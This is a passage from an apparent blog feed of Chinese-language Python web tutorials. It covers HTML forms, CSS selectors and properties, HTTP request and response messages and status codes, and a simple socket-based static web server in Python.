  &lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;1&quot; /&gt; 女    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;爱好：&lt;/label&gt;        &lt;input type=&quot;checkbox&quot; name=&quot;like&quot; value=&quot;sing&quot; /&gt; 唱歌        &lt;input type=&quot;checkbox&quot; name=&quot;like&quot; value=&quot;run&quot; /&gt; 跑步        &lt;input type=&quot;checkbox&quot; name=&quot;like&quot; value=&quot;swiming&quot; /&gt; 游泳    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;照片：&lt;/label&gt;        &lt;input type=&quot;file&quot; name=&quot;person_pic&quot;&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;个人描述：&lt;/label&gt;        &lt;textarea name=&quot;about&quot;&gt;&lt;/textarea&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;label&gt;籍贯：&lt;/label&gt;        &lt;select name=&quot;site&quot;&gt;            &lt;option value=&quot;0&quot;&gt;北京&lt;/option&gt;            &lt;option value=&quot;1&quot;&gt;上海&lt;/option&gt;            &lt;option value=&quot;2&quot;&gt;广州&lt;/option&gt;            &lt;option value=&quot;3&quot;&gt;深圳&lt;/option&gt;        &lt;/select&gt;    &lt;/p&gt;    &lt;p&gt;        &lt;input type=&quot;submit&quot; name=&quot;&quot; value=&quot;提交&quot;&gt;        &lt;input type=&quot;reset&quot; name=&quot;&quot; value=&quot;重置&quot;&gt;    &lt;/p&gt;&lt;/form&gt;</code></pre><h2 id="九、css-的介绍"><a href="#九、css-的介绍" class="headerlink" title="九、css 的介绍"></a>九、css 的介绍</h2><h3 id="1-css-的定义"><a href="#1-css-的定义" class="headerlink" title="1. css 的定义"></a>1. css 的定义</h3><blockquote><p>css(Cascading Style Sheet)层叠样式表，它是用来美化页面的一种语言。</p></blockquote><h3 id="2-css-的作用"><a href="#2-css-的作用" class="headerlink" title="2. css 的作用"></a>2. css 的作用</h3><ol><li>美化界面, 比如: 设置标签文字大小、颜色、字体加粗等样式。</li><li>控制页面布局, 比如: 设置浮动、定位等样式。</li></ol><h3 id="3-css-的基本语法"><a href="#3-css-的基本语法" class="headerlink" title="3. css 的基本语法"></a>3. css 的基本语法</h3><p>选择器{</p><p>样式规则</p><p>}</p><p>样式规则：</p><p>属性名1：属性值1;</p><p>属性名2：属性值2;</p><p>属性名3：属性值3;</p><p>…</p><p>选择器:<strong>是用来选择标签的，选出来以后给标签加样式。</strong></p><p><strong>代码示例:</strong></p><pre><code class="html">div{     width:100px;     height:100px;     background:gold; }</code></pre><p><strong>说明</strong></p><p>css 是由两个主要的部分构成：<strong>选择器和一条或多条样式规则</strong>，注意:<strong>样式规则需要放到大括号里面。</strong></p><h2 id="十、css-的引入方式"><a href="#十、css-的引入方式" class="headerlink" title="十、css 的引入方式"></a>十、css 的引入方式</h2><p><strong>css的三种引入方式</strong></p><ol><li><p>行内式</p></li><li><p>内嵌式（内部样式）</p></li><li><p>外链式</p><p>说明：</p><p>外链式是在公司开发的时候会使用，最能体现 div+css 的标签内容与显示样式分离的思想， 也最易改版维护，代码看起来也是最美观的一种。</p></li></ol><h3 id="1-行内式"><a href="#1-行内式" class="headerlink" title="1. 行内式"></a>1. 行内式</h3><blockquote><p>直接在标签的 style 属性中添加 css 样式</p></blockquote><p><strong>示例代码:</strong></p><pre><code class="html">&lt;div style=&quot;width:100px; height:100px; background:red &quot;&gt;hello&lt;/div&gt;</code></pre><p>优点：方便、直观。 缺点：缺乏可重用性。</p><h3 id="2-内嵌式（内部样式）"><a href="#2-内嵌式（内部样式）" class="headerlink" title="2. 内嵌式（内部样式）"></a>2. 内嵌式（内部样式）</h3><blockquote><p>在<code>&lt;head&gt;</code>标签内加入<code>&lt;style&gt;</code>标签，在<code>&lt;style&gt;</code>标签中编写css代码。</p></blockquote><p><strong>示例代码:</strong></p><pre><code class="html">&lt;head&gt;   &lt;style type=&quot;text/css&quot;&gt;      h3{         color:red;      }   &lt;/style&gt;&lt;/head&gt;</code></pre><p>优点：在同一个页面内部便于复用和维护。 缺点：在多个页面之间的可重用性不够高。</p><h3 id="3-外链式"><a href="#3-外链式" class="headerlink" title="3. 外链式"></a>3. 外链式</h3><blockquote><p>将css代码写在一个单独的.css文件中，在<code>&lt;head&gt;</code>标签中使用<code>&lt;link&gt;</code>标签直接引入该文件到页面中。</p></blockquote><p><strong>示例代码:</strong></p><pre><code class="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/main.css&quot;&gt;</code></pre><p>优点：使得css样式与html页面分离，便于整个页面系统的规划和维护，可重用性高。 缺点：css代码由于分离到单独的css文件，容易出现css代码过于集中，若维护不当则极容易造成混乱。</p><h3 id="4-css引入方式选择"><a href="#4-css引入方式选择" class="headerlink" title="4. css引入方式选择"></a>4. css引入方式选择</h3><ol><li>行内式几乎不用</li><li>内嵌式在学习css样式的阶段使用</li><li>外链式在公司开发的阶段使用，可以对 css 样式和 html 页面分别进行开发。</li></ol><h2 id="十一、css-选择器"><a href="#十一、css-选择器" class="headerlink" title="十一、css 选择器"></a>十一、css 选择器</h2><h3 id="1-css-选择器的定义"><a href="#1-css-选择器的定义" class="headerlink" title="1. css 选择器的定义"></a>1. css 选择器的定义</h3><p>css 选择器是用来选择标签的，选出来以后给标签加样式。</p><h3 id="2-css-选择器的种类"><a href="#2-css-选择器的种类" class="headerlink" title="2. css 选择器的种类"></a>2. css 选择器的种类</h3><ol><li>标签选择器</li><li>类选择器</li><li>层级选择器(后代选择器)</li><li>id选择器</li><li>组选择器</li><li>伪类选择器</li></ol><h3 id="3-标签选择器"><a href="#3-标签选择器" class="headerlink" title="3. 标签选择器"></a>3. 标签选择器</h3><p>根据标签来选择标签，<strong>以标签开头</strong>，此种选择器影响范围大，一般用来做一些通用设置。</p><p><strong>示例代码</strong></p><pre><code class="html">&lt;style type=&quot;text/css&quot;&gt;    p{        color: red;    }&lt;/style&gt;&lt;div&gt;hello&lt;/div&gt;&lt;p&gt;hello&lt;/p&gt;</code></pre><h3 id="4-类选择器"><a href="#4-类选择器" class="headerlink" title="4. 类选择器"></a>4. 类选择器</h3><p>根据类名来选择标签，<strong>以 . 开头</strong>, 一个类选择器可应用于多个标签上，一个标签上也可以使用多个类选择器，多个类选择器需要使用空格分割，应用灵活，可复用，是css中应用最多的一种选择器。</p><p><strong>示例代码</strong></p><pre><code class="html">&lt;style type=&quot;text/css&quot;&gt;    .blue{color:blue}    .big{font-size:20px}    .box{width:100px;height:100px;background:gold} &lt;/style&gt;&lt;div class=&quot;blue&quot;&gt;这是一个div&lt;/div&gt;&lt;h3 class=&quot;blue big box&quot;&gt;这是一个标题&lt;/h3&gt;&lt;p class=&quot;blue box&quot;&gt;这是一个段落&lt;/p&gt;</code></pre><h3 id="5-层级选择器-后代选择器"><a href="#5-层级选择器-后代选择器" class="headerlink" title="5. 层级选择器(后代选择器)"></a>5. 层级选择器(后代选择器)</h3><p>根据层级关系选择后代标签，<strong>以选择器1 选择器2开头</strong>，主要应用在标签嵌套的结构中，减少命名。</p><p><strong>示例代码</strong></p><pre><code class="html">&lt;style type=&quot;text/css&quot;&gt;    div p{        color: red;    }    .con{width:300px;height:80px;background:green}    .con span{color:red}    .con .pink{color:pink}    .con .gold{color:gold}    &lt;/style&gt;&lt;div&gt;    &lt;p&gt;hello&lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;con&quot;&gt;    &lt;span&gt;哈哈&lt;/span&gt;    &lt;a href=&quot;#&quot; class=&quot;pink&quot;&gt;百度&lt;/a&gt;    &lt;a href=&quot;#&quot; class=&quot;gold&quot;&gt;谷歌&lt;/a&gt;&lt;/div&gt;&lt;span&gt;你好&lt;/span&gt;&lt;a href=&quot;#&quot; class=&quot;pink&quot;&gt;新浪&lt;/a&gt;</code></pre><p><strong>注意点: 这个层级关系不一定是父子关系，也有可能是祖孙关系，只要有后代关系都适用于这个层级选择器</strong></p><h3 id="6-id选择器"><a href="#6-id选择器" class="headerlink" title="6. id选择器"></a>6. id选择器</h3><p>根据id选择标签，以#开头, 元素的id名称不能重复，所以id选择器只能对应于页面上一个元素，不能复用，id名一般给程序使用，所以不推荐使用id作为选择器。</p><p><strong>示例代码</strong></p><pre><code class="html">&lt;style type=&quot;text/css&quot;&gt;    #box{color:red} &lt;/style&gt;&lt;p id=&quot;box&quot;&gt;这是一个段落标签&lt;/p&gt;   &lt;!-- 对应以上一条样式，其它元素不允许应用此样式 --&gt;&lt;p&gt;这是第二个段落标签&lt;/p&gt; &lt;!-- 无法应用以上样式，每个标签只能有唯一的id名 --&gt;&lt;p&gt;这是第三个段落标签&lt;/p&gt; &lt;!-- 无法应用以上样式，每个标签只能有唯一的id名  --&gt;</code></pre><p><strong>注意点: 虽然给其它标签设置id=“box”也可以设置样式，但是不推荐这样做，因为id是唯一的，以后js通过id只能获取一个唯一的标签对象。</strong></p><h3 id="7-组选择器"><a href="#7-组选择器" class="headerlink" title="7. 组选择器"></a>7. 组选择器</h3><p>根据组合的选择器选择不同的标签，<strong>以 , 分割开</strong>, 如果有公共的样式设置，可以使用组选择器。</p><p><strong>示例代码</strong></p><pre><code class="html">&lt;style type=&quot;text/css&quot;&gt;    .box1,.box2,.box3{width:100px;height:100px}    .box1{background:red}    .box2{background:pink}    .box2{background:gold}&lt;/style&gt;&lt;div class=&quot;box1&quot;&gt;这是第一个div&lt;/div&gt;&lt;div class=&quot;box2&quot;&gt;这是第二个div&lt;/div&gt;&lt;div class=&quot;box3&quot;&gt;这是第三个div&lt;/div&gt;</code></pre><h3 id="8-伪类选择器"><a href="#8-伪类选择器" class="headerlink" title="8. 伪类选择器"></a>8. 伪类选择器</h3><p>用于向选择器添加特殊的效果, <strong>以 : 分割开</strong>, 当用户和网站交互的时候改变显示效果可以使用伪类选择器</p><p><strong>示例代码</strong></p><pre><code class="html">&lt;style type=&quot;text/css&quot;&gt;    .box1{width:100px;height:100px;background:gold;}    .box1:hover{width:300px;}&lt;/style&gt;&lt;div class=&quot;box1&quot;&gt;这是第一个div&lt;/div&gt;</code></pre><h2 id="十二、css-属性"><a href="#十二、css-属性" class="headerlink" title="十二、css 属性"></a>十二、css 属性</h2><h3 id="1-布局常用样式属性"><a href="#1-布局常用样式属性" class="headerlink" title="1. 布局常用样式属性"></a>1. 布局常用样式属性</h3><ul><li>width 设置元素(标签)的宽度，如：width:100px;</li><li>height 设置元素(标签)的高度，如：height:200px;</li><li>background 设置元素背景色或者背景图片，如：background:gold; 设置元素的背景色, background: url(images/logo.png); 设置元素的背景图片。</li><li>border 设置元素四周的边框，如：border:1px solid black; 设置元素四周边框是1像素宽的黑色实线</li><li>以上也可以拆分成四个边的写法，分别设置四个边的：</li><li>border-top 设置顶边边框，如：border-top:10px solid red;</li><li>border-left 设置左边边框，如：border-left:10px solid blue;</li><li>border-right 设置右边边框，如：border-right:10px solid green;</li><li>border-bottom 设置底边边框，如：border-bottom:10px solid pink;</li></ul><h3 id="2-文本常用样式属性"><a href="#2-文本常用样式属性" class="headerlink" title="2. 文本常用样式属性"></a>2. 文本常用样式属性</h3><ul><li>color 设置文字的颜色，如： color:red;</li><li>font-size 设置文字的大小，如：font-size:12px;</li><li>font-family 设置文字的字体，如：font-family:’微软雅黑’;为了避免中文字不兼容，一般写成：font-family:’Microsoft Yahei’;</li><li>font-weight 设置文字是否加粗，如：font-weight:bold; 设置加粗 font-weight:normal 设置不加粗</li><li>line-height 设置文字的行高，如：line-height:24px; 表示文字高度加上文字上下的间距是24px，也就是每一行占有的高度是24px</li><li>text-decoration 设置文字的下划线，如：text-decoration:none; 将文字下划线去掉</li><li>text-align 设置文字水平对齐方式，如text-align:center 设置文字水平居中</li><li>text-indent 设置文字首行缩进，如：text-indent:24px; 设置文字首行缩进24px</li></ul><h3 id="3-布局常用样式属性示例代码"><a href="#3-布局常用样式属性示例代码" class="headerlink" title="3. 布局常用样式属性示例代码"></a>3. 布局常用样式属性示例代码</h3><pre><code class="html">&lt;style&gt;    .box1{        width: 200px;         height: 200px;         background:yellow;         border: 1px solid black;    }    .box2{        /* 这里是注释内容 */        /* 设置宽度 */        width: 100px;        /* 设置高度 */        height: 100px;        /* 设置背景色 */        background: red;        /* 设置四边边框 */        /* border: 10px solid black; */        border-top: 10px solid black;        border-left: 10px solid black;        border-right: 10px solid black;        border-bottom: 10px solid black;        /* 设置内边距， 内容到边框的距离，如果设置四边是上右下左 */        /* padding: 10px;   */        padding-left: 10px;        padding-top: 10px;        /* 设置外边距，设置元素边框到外界元素边框的距离 */        margin: 10px;        /* margin-top: 10px;        margin-left: 10px; */        float: left;    }    .box3{        width: 48px;         height: 48px;         background:pink;         border: 1px solid black;        float: left;    }&lt;/style&gt;&lt;div class=&quot;box1&quot;&gt;    &lt;div class=&quot;box2&quot;&gt;        padding 设置元素包含的内容和元素边框的距离    &lt;/div&gt;    &lt;div class=&quot;box3&quot;&gt;    &lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="4-文本常用样式属性示例"><a href="#4-文本常用样式属性示例" class="headerlink" title="4. 文本常用样式属性示例"></a>4. 文本常用样式属性示例</h3><pre><code class="html">&lt;style&gt;    p{       /* 设置字体大小  浏览器默认是 16px */       font-size:20px;       /* 设置字体 */       font-family: &quot;Microsoft YaHei&quot;;        /* 设置字体加粗 */       font-weight: bold;       /* 设置字体颜色 */       color: red;       /* 增加掉下划线 */       text-decoration: underline;       /* 设置行高  */       line-height: 100px;       /* 设置背景色 */       background: green;       /* 设置文字居中 */       /* text-align: center; */       text-indent: 40px;    }    a{        /* 去掉下划线 */        text-decoration: none;    }&lt;/style&gt;&lt;a href=&quot;#&quot;&gt;连接标签&lt;/a&gt;&lt;p&gt;    你好，世界!&lt;/p&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级04-HTTP协议和静态WEB服务器</title>
      <link href="/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A704-HTTP%E5%8D%8F%E8%AE%AE%E5%92%8C%E9%9D%99%E6%80%81WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/08/21/2020-08-22-python%E9%AB%98%E7%BA%A704-HTTP%E5%8D%8F%E8%AE%AE%E5%92%8C%E9%9D%99%E6%80%81WEB%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="HTTP协议和静态WEB服务器"><a href="#HTTP协议和静态WEB服务器" class="headerlink" title="HTTP协议和静态WEB服务器"></a>HTTP协议和静态WEB服务器</h1><h2 id="一、HTTP-协议"><a href="#一、HTTP-协议" class="headerlink" title="一、HTTP 协议"></a>一、HTTP 协议</h2><h3 id="1-HTTP-协议的介绍"><a href="#1-HTTP-协议的介绍" class="headerlink" title="1. HTTP 协议的介绍"></a>1. HTTP 协议的介绍</h3><a id="more"></a><p>HTTP 协议的全称是(HyperText Transfer Protocol)，翻译过来就是<strong>超文本传输协议</strong>。</p><p>超文本是超级文本的缩写，是指超越文本限制或者超链接，比如:图片、音乐、视频、超链接等等都属于超文本。</p><p>HTTP 协议的制作者是<strong>蒂姆·伯纳斯-李</strong>，1991年设计出来的，<strong>HTTP 协议设计之前目的是传输网页数据的，现在允许传输任意类型的数据</strong>。</p><p><strong>传输 HTTP 协议格式的数据是基于 TCP 传输协议的，发送数据之前需要先建立连接。</strong></p><h3 id="2-HTTP-协议的作用"><a href="#2-HTTP-协议的作用" class="headerlink" title="2. HTTP 协议的作用"></a>2. HTTP 协议的作用</h3><p>它<strong>规定了浏览器和 Web 服务器通信数据的格式，也就是说浏览器和web服务器通信需要使用http协议</strong>。</p><h3 id="3-浏览器访问web服务器的通信过程"><a href="#3-浏览器访问web服务器的通信过程" class="headerlink" title="3. 浏览器访问web服务器的通信过程"></a>3. 浏览器访问web服务器的通信过程</h3><p>第1步：浏览器客户端通过DNS（域名解析服务器）将目标网站域名（例如<a href="http://www.baidu.com)解析成IP地址(39.156.69.79)" target="_blank" rel="noopener">www.baidu.com)解析成IP地址(39.156.69.79)</a> &gt;&gt;&gt;获取到目标ip</p><p>第2步：浏览器客户端与web服务器程序默认80端口号建立连接</p><p>第3步：浏览器向web服务器发送http请求数据</p><p>第4步：web服务器收到请求后根据请求向服务器主机获取资源</p><p>第5步：服务器主机将资源返回给web服务器</p><p>第6步：web服务器向浏览器返回http响应数据</p><h2 id="二、URL"><a href="#二、URL" class="headerlink" title="二、URL"></a>二、URL</h2><h3 id="1-URL的概念"><a href="#1-URL的概念" class="headerlink" title="1. URL的概念"></a>1. URL的概念</h3><p>URL的英文全拼是(Uniform Resoure Locator),表达的意思是统一资源定位符，通俗理解就是网络资源地址，也就是我们常说的网址。</p><h3 id="2-URL的组成"><a href="#2-URL的组成" class="headerlink" title="2. URL的组成"></a>2. URL的组成</h3><p><strong>URL的样子:</strong></p><p><a href="https://news.163.com/18/1122/10/E178J2O4000189FH.html" target="_blank" rel="noopener">https://news.163.com/18/1122/10/E178J2O4000189FH.html</a></p><p><strong>URL的组成部分:</strong></p><ol><li><strong>协议部分</strong>: https://、http://、ftp://</li><li><strong>域名部分</strong>: news.163.com</li><li><strong>资源路径部分</strong>: /18/1122/10/E178J2O4000189FH.html</li></ol><p><strong>域名:</strong></p><p>域名就是<strong>IP地址的别名</strong>，它是用点进行分割使用英文字母和数字组成的名字，<strong>使用域名目的就是方便的记住某台主机IP地址</strong>。</p><p><strong>URL的扩展:</strong></p><p><a href="https://news.163.com/hello.html?page=1&amp;count=10" target="_blank" rel="noopener">https://news.163.com/hello.html?page=1&amp;count=10</a></p><ul><li><strong>查询参数部分</strong>: ?page=1&amp;count=10</li></ul><p><strong>参数说明:</strong></p><ul><li>? 后面的 page 表示第一个参数，后面的参数都使用 &amp; 进行连接</li></ul><h2 id="三、查看HTTP协议的通信过程"><a href="#三、查看HTTP协议的通信过程" class="headerlink" title="三、查看HTTP协议的通信过程"></a>三、查看HTTP协议的通信过程</h2><h3 id="1-谷歌浏览器开发者工具的使用"><a href="#1-谷歌浏览器开发者工具的使用" class="headerlink" title="1. 谷歌浏览器开发者工具的使用"></a>1. 谷歌浏览器开发者工具的使用</h3><p>首先需要安装Google Chrome浏览器，然后Windows和Linux平台按<strong>F12</strong>调出开发者工具, mac OS选择 视图 -&gt; 开发者 -&gt; 开发者工具或者直接使用 <strong>alt+command+i</strong> 这个快捷键，还有一个多平台通用的操作就是在<strong>网页右击选择检查</strong>。</p><p><strong>开发者工具的标签选项说明:</strong></p><ul><li>元素（Elements）：用于查看或修改HTML标签</li><li>控制台（Console）：执行js代码</li><li>源代码（Sources）：查看静态资源文件，断点调试JS代码</li><li>网络（Network）：查看http协议的通信过程</li></ul><p><strong>开发者工具的使用说明:</strong></p><ol><li>点击Network标签选项</li><li>在浏览器的地址栏输入百度的网址，就能看到请求百度首页的http的通信过程</li><li><strong>这里的每项记录都是请求+响应的一次过程</strong></li></ol><h2 id="四、HTTP-请求报文"><a href="#四、HTTP-请求报文" class="headerlink" title="四、HTTP 请求报文"></a>四、HTTP 请求报文</h2><h3 id="1-HTTP-请求报文介绍"><a href="#1-HTTP-请求报文介绍" class="headerlink" title="1. HTTP 请求报文介绍"></a>1. HTTP 请求报文介绍</h3><p><strong>HTTP最常见的请求报文有两种:</strong></p><ol><li>GET 方式的请求报文</li><li>POST 方式的请求报文</li></ol><p><strong>说明:</strong></p><ul><li>GET: 获取web服务器数据</li><li>POST: 向web服务器提交数据</li></ul><h3 id="2-HTTP-GET-请求报文分析"><a href="#2-HTTP-GET-请求报文分析" class="headerlink" title="2. HTTP GET 请求报文分析"></a>2. HTTP GET 请求报文分析</h3><p><strong>GET 请求报文说明:</strong></p><pre><code class="http">---- 请求行 ----GET / HTTP/1.1  # GET请求方式 请求资源路径 HTTP协议版本---- 请求头 -----Host: www.itcast.cn  # 服务器的主机地址和端口号,默认是80Connection: keep-alive # 和服务端保持长连接Upgrade-Insecure-Requests: 1 # 让浏览器升级不安全请求，使用https请求User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36  # 用户代理，也就是客户端的名称Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 # 可接受的数据类型Accept-Encoding: gzip, deflate # 可接受的压缩格式Accept-Language: zh-CN,zh;q=0.9 #可接受的语言Cookie: pgv_pvi=1246921728; # 登录用户的身份标识---- 空行 ----</code></pre><p><strong>GET 请求原始报文说明:</strong></p><pre><code class="http">GET / HTTP/1.1\r\nHost: www.itcast.cn\r\n  Connection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9\r\nCookie: pgv_pvi=1246921728; \r\n\r\n  (请求头信息后面还有一个单独的’\r\n’不能省略)</code></pre><p><strong>说明：</strong></p><ul><li>每项数据之间使用:<strong>\r\n</strong></li></ul><p><strong>POST 请求报文说明:</strong></p><pre><code class="http">---- 请求行 ----POST /xmweb?host=mail.itcast.cn&amp;_t=1542884567319 HTTP/1.1 # POST请求方式 请求资源路径 HTTP协议版本---- 请求头 ----Host: mail.itcast.cn # 服务器的主机地址和端口号,默认是80Connection: keep-alive # 和服务端保持长连接Content-Type: application/x-www-form-urlencoded  # 告诉服务端请求的数据类型User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 # 客户端的名称---- 空行 -------- 请求体 ----username=hello&amp;pass=hello # 请求参数</code></pre><p><strong>POST 请求原始报文说明:</strong></p><pre><code class="http">POST /xmweb?host=mail.itcast.cn&amp;_t=1542884567319 HTTP/1.1\r\nHost: mail.itcast.cn\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36\r\n\r\n(请求头信息后面还有一个单独的’\r\n’不能省略)username=hello&amp;pass=hello</code></pre><p><strong>说明：</strong></p><ul><li>每项数据之间使用:<strong>\r\n</strong></li></ul><h2 id="五、HTTP响应报文"><a href="#五、HTTP响应报文" class="headerlink" title="五、HTTP响应报文"></a>五、HTTP响应报文</h2><h3 id="1-HTTP响应报文分析"><a href="#1-HTTP响应报文分析" class="headerlink" title="1. HTTP响应报文分析"></a>1. HTTP响应报文分析</h3><p>一个HTTP响应报文是由<strong>响应行、响应头、空行和响应体</strong>4个部分组成。</p><p>响应行是由三部分组成：<strong>HTTP协议版本 状态码 状态描述</strong>，最常见的状态码是200</p><p><strong>响应报文说明:</strong></p><pre><code class="http">--- 响应行/状态行 ---HTTP/1.1 200 OK # HTTP协议版本 状态码 状态描述--- 响应头 ---Server: Tengine # 服务器名称Content-Type: text/html; charset=UTF-8 # 内容类型Transfer-Encoding: chunked # 发送给客户端内容不确定内容长度，发送结束的标记是0\r\n, Content-Length表示服务端确定发送给客户端的内容大小，但是二者只能用其一。Connection: keep-alive # 和客户端保持长连接Date: Fri, 23 Nov 2018 02:01:05 GMT # 服务端的响应时间--- 空行 ------ 响应体 ---&lt;!DOCTYPE html&gt;&lt;html lang=“en”&gt; …&lt;/html&gt; # 响应给客户端的数据</code></pre><p><strong>原始响应报文说明:</strong></p><pre><code class="http">HTTP/1.1 200 OK\r\nServer: Tengine\r\nContent-Type: text/html; charset=UTF-8\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\nDate: Fri, 23 Nov 2018 02:01:05 GMT\r\n\r\n(响应头信息后面还有一个单独的’\r\n’不能省略)&lt;!DOCTYPE html&gt;&lt;html lang=“en”&gt; …&lt;/html&gt;</code></pre><p><strong>说明:</strong></p><p>每项数据之间使用:<strong>\r\n</strong></p><h3 id="2-HTTP-状态码介绍"><a href="#2-HTTP-状态码介绍" class="headerlink" title="2. HTTP 状态码介绍"></a>2. HTTP 状态码介绍</h3><p>HTTP 状态码是<strong>用于表示web服务器响应状态的3位数字代码</strong>。</p><table><thead><tr><th align="left">状态码</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">200</td><td align="left">请求成功</td></tr><tr><td align="left">307</td><td align="left">重定向</td></tr><tr><td align="left">400</td><td align="left">错误的请求，请求地址或者参数有误</td></tr><tr><td align="left">404</td><td align="left">请求资源在服务器不存在</td></tr><tr><td align="left">500</td><td align="left">服务器内部源代码出现错误</td></tr></tbody></table><h2 id="六、搭建Python自带静态Web服务器"><a href="#六、搭建Python自带静态Web服务器" class="headerlink" title="六、搭建Python自带静态Web服务器"></a>六、搭建Python自带静态Web服务器</h2><h3 id="1-静态Web服务器是什么？"><a href="#1-静态Web服务器是什么？" class="headerlink" title="1. 静态Web服务器是什么？"></a>1. 静态Web服务器是什么？</h3><p>可以<strong>为发出请求的浏览器提供静态文档的程序</strong>。</p><p>平时我们浏览百度新闻数据的时候，<strong>每天的新闻数据都会发生变化，那访问的这个页面就是动态的</strong>，而我们开发的是<strong>静态的，页面的数据不会发生变化</strong>。</p><h3 id="2-如何搭建Python自带的静态Web服务器"><a href="#2-如何搭建Python自带的静态Web服务器" class="headerlink" title="2. 如何搭建Python自带的静态Web服务器"></a>2. 如何搭建Python自带的静态Web服务器</h3><p>搭建Python自带的静态Web服务器使用 <strong>python3 -m http.server 端口号</strong></p><pre><code class="bash">ubuntu@python:~$ python3 -m http.server 8080Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...</code></pre><p><strong>-m选项说明:</strong></p><p>-m表示<strong>运行包里面的模块</strong>，执行这个命令的时候，需要进入你<strong>自己指定静态文件的目录</strong>，然后通过浏览器就能访问对应的 html文件了，这样一个静态的web服务器就搭建好了。</p><h3 id="3-访问搭建的静态Web服务器"><a href="#3-访问搭建的静态Web服务器" class="headerlink" title="3. 访问搭建的静态Web服务器"></a>3. 访问搭建的静态Web服务器</h3><p>在浏览器上输入127.0.0.1:8080</p><h3 id="4-查看浏览器和搭建的静态Web服务器的通信过程"><a href="#4-查看浏览器和搭建的静态Web服务器的通信过程" class="headerlink" title="4. 查看浏览器和搭建的静态Web服务器的通信过程"></a>4. 查看浏览器和搭建的静态Web服务器的通信过程</h3><p>在浏览器上按F12键或者右键选择检查打开调试控制台</p><p>选择Network或者网络</p><p>刷新一下就可以看到通信过程了</p><h2 id="七、静态Web服务器-返回固定页面数据"><a href="#七、静态Web服务器-返回固定页面数据" class="headerlink" title="七、静态Web服务器-返回固定页面数据"></a>七、静态Web服务器-返回固定页面数据</h2><h3 id="1-开发自己的静态Web服务器"><a href="#1-开发自己的静态Web服务器" class="headerlink" title="1. 开发自己的静态Web服务器"></a>1. 开发自己的静态Web服务器</h3><p><strong>实现步骤:</strong></p><ol><li>编写一个TCP服务端程序</li><li>获取浏览器发送的http请求报文数据</li><li>读取固定页面数据，把页面数据组装成HTTP响应报文数据发送给浏览器。</li><li>HTTP响应报文数据发送完成以后，关闭服务于客户端的套接字。</li></ol><h3 id="2-静态Web服务器-返回固定页面数据的示例代码"><a href="#2-静态Web服务器-返回固定页面数据的示例代码" class="headerlink" title="2. 静态Web服务器-返回固定页面数据的示例代码"></a>2. 静态Web服务器-返回固定页面数据的示例代码</h3><pre><code class="python">import socketif __name__ == &#39;__main__&#39;:    # 创建tcp服务端套接字    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # 设置端口号复用, 程序退出端口立即释放    tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)    # 绑定端口号    tcp_server_socket.bind((&quot;&quot;, 9000))    # 设置监听    tcp_server_socket.listen(128)    while True:        # 等待接受客户端的连接请求        new_socket, ip_port = tcp_server_socket.accept()        # 代码执行到此，说明连接建立成功        recv_client_data = new_socket.recv(4096)        # 对二进制数据进行解码        recv_client_content = recv_client_data.decode(&quot;utf-8&quot;)        print(recv_client_content)        with open(&quot;static/index.html&quot;, &quot;rb&quot;) as file:            # 读取文件数据            file_data = file.read()        # 响应行        response_line = &quot;HTTP/1.1 200 OK\r\n&quot;        # 响应头        response_header = &quot;Server: PWS1.0\r\n&quot;        # 响应体        response_body = file_data        # 拼接响应报文        response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body        # 发送数据        new_socket.send(response_data)        # 关闭服务与客户端的套接字        new_socket.close()</code></pre><h2 id="八、静态Web服务器-返回指定页面数据"><a href="#八、静态Web服务器-返回指定页面数据" class="headerlink" title="八、静态Web服务器-返回指定页面数据"></a>八、静态Web服务器-返回指定页面数据</h2><h3 id="1-静态Web服务器的问题"><a href="#1-静态Web服务器的问题" class="headerlink" title="1. 静态Web服务器的问题"></a>1. 静态Web服务器的问题</h3><p>目前的Web服务器，不管用户访问什么页面，返回的都是固定页面的数据，接下来需要根据用户的请求返回指定页面的数据</p><p><strong>返回指定页面数据的实现步骤:</strong></p><ol><li>获取用户请求资源的路径</li><li>根据请求资源的路径，读取指定文件的数据</li><li>组装指定文件数据的响应报文，发送给浏览器</li><li>判断请求的文件在服务端不存在，组装404状态的响应报文，发送给浏览器</li></ol><h3 id="2-静态Web服务器-返回指定页面数据的示例代码"><a href="#2-静态Web服务器-返回指定页面数据的示例代码" class="headerlink" title="2. 